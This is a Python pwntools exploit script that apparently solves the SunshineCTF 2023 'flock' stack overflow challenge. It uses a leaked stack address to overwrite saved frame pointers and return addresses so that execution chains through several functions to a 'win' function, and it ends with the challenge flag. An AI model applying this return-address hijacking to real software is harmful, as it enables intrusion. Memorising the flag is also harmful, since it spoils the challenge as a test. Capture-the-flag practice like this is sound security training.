#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./flock_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chal.2023.sunshinectf.games", 23004)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'At ')
	leak = int(r.recvline(), 16)
	print(f'{hex(leak)=}')

	payload = flat(
		{
			16 * 8: leak + (0x7fffffffe4c0 - 0x7fffffffe420),
			17 * 8: 0x401276, # func4

			20 * 8: leak + (0x7fffffffe4e0 - 0x7fffffffe420),
			21 * 8: 0x4012a0, # func3

			24 * 8: leak + (0x7fffffffe500 - 0x7fffffffe420),
			25 * 8: 0x4012ca, # func2

			28 * 8: leak + (0x7fffffffe510 - 0x7fffffffe420),
			29 * 8: 0x4012f0, # func1
			
			30 * 8: leak + (0x7fffffffe520 - 0x7fffffffe420),
			
			31 * 8: 0x4012f2,
			32 * 8: exe.sym['win'],
		}
	)

	r.sendlineafter(b'>', payload)

	r.interactive()


if __name__ == "__main__":
	main()

# sun{here_then_there_then_everywhere}
